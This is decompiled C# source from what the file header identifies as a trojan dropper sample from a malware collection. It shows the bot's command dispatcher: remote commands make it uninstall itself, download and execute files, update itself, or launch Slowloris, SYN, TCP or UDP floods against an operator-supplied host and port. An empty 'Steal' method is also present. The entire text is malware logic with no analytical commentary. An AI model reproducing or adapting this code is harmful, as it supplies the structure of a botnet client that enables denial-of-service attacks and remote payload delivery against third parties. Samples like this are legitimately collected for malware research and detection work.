// Decompiled with JetBrains decompiler
// Type: Poly._command
// Assembly: Poly, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 618F3010-979B-4F78-8F99-D5C35E30AA2E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Dropper.Win32.Sysn.bshb-a13f90b28df8b73652beb4c3c95ff1b8dc0c2fc41dee8f7d6acdd43828a0aadc.exe

using System;

namespace Poly
{
  public class _command : Base_Settings
  {
    private static int task;
    private static string[] taskArray;

    public _command() => this.Initialise();

    public override void Run() => this.issueCommand();

    public override void Initialise()
    {
      try
      {
        _command.task = int.Parse(Base_Settings.command);
        _command.taskArray = Base_Settings.response;
      }
      catch
      {
      }
    }

    private void issueCommand()
    {
      if (Base_Settings.busy)
        return;
      Base_Settings.busy = true;
      switch (_command.task)
      {
        case 0:
          Base_Settings.status = "Removed by user";
          _communicate.setReturn(1);
          _communicate.forceTalk();
          _Install.Uninstall();
          break;
        case 1:
          Base_Settings.status = "Downloaded File";
          this.Download();
          _communicate.setReturn(1);
          break;
        case 2:
          Base_Settings.status = "starting flood";
          this.Flood();
          _communicate.setReturn(2);
          break;
        case 3:
          this.Update();
          break;
      }
    }

    private void Update()
    {
      string task1 = _command.taskArray[1];
      string str1 = string.Empty;
      string str2 = string.Empty;
      string Path;
      if (_command.taskArray.Length == 3)
      {
        string task2 = _command.taskArray[2];
        Path = Function.Update(task1, task2);
      }
      else
        Path = Function.Update(task1);
      if (Path == string.Empty)
        Base_Settings.status = "Error";
      else
        _Install.Update(Path);
      str1 = (string) null;
      str2 = (string) null;
    }

    private void Download()
    {
      try
      {
        string task1 = _command.taskArray[1];
        string str;
        if (_command.taskArray.Length >= 3)
        {
          string task2 = _command.taskArray[2];
          if (Function.DlExecute(task1, task2))
          {
            str = (string) null;
            Base_Settings.busy = false;
          }
          else
          {
            _communicate.setReturn(0);
            Base_Settings.status = "Failed downloading file";
          }
        }
        else if (Function.DlExecute(task1))
        {
          str = (string) null;
          Base_Settings.busy = false;
        }
        else
        {
          _communicate.setReturn(0);
          Base_Settings.status = "Failed downloading file";
        }
      }
      catch
      {
      }
    }

    private void Flood()
    {
      this.Initialise();
      Console.WriteLine("Flood started?");
      bool flag = true;
      Function.Type type = Function.Type.Slowloris;
      string Host = "";
      int Packets;
      try
      {
        Packets = int.Parse(_command.taskArray[5]);
      }
      catch
      {
        Packets = 1024;
      }
      int Timeout;
      try
      {
        Timeout = int.Parse(_command.taskArray[6]);
      }
      catch
      {
        Timeout = 3000;
      }
      int Sockets;
      try
      {
        Sockets = int.Parse(_command.taskArray[4]);
      }
      catch
      {
        Sockets = 20;
      }
      try
      {
        switch (int.Parse(_command.taskArray[1]))
        {
          case 1:
            type = Function.Type.Slowloris;
            break;
          case 2:
            type = Function.Type.SYN;
            break;
          case 3:
            type = Function.Type.TCP;
            break;
          case 4:
            type = Function.Type.UDP;
            break;
          default:
            type = Function.Type.Slowloris;
            break;
        }
      }
      catch
      {
        flag = false;
      }
      int Port;
      try
      {
        Port = int.Parse(_command.taskArray[3]);
      }
      catch
      {
        Port = 80;
      }
      try
      {
        Host = _command.taskArray[2];
      }
      catch
      {
        flag = false;
      }
      Console.WriteLine("Flood valid? : {0}", (object) flag);
      if (flag)
      {
        Function.InitFlood(type, Host, Port, Sockets, Packets, Timeout);
        Function.Begin();
        Console.WriteLine("Flood started @@");
        Console.WriteLine("Current busy state = {0}", (object) Base_Settings.busy);
      }
      else
      {
        if (flag)
          return;
        _communicate.setReturn(0);
        Console.WriteLine("HOST = {0}\n Flood type = {1}\n PORT = {2}\n SOCKETS = {3}\n PACKETS = {4}\n TIMEOUT = {5}\n", (object) Host, (object) type, (object) Port, (object) Sockets, (object) Packets, (object) Timeout);
      }
    }

    private void Steal()
    {
    }
  }
}
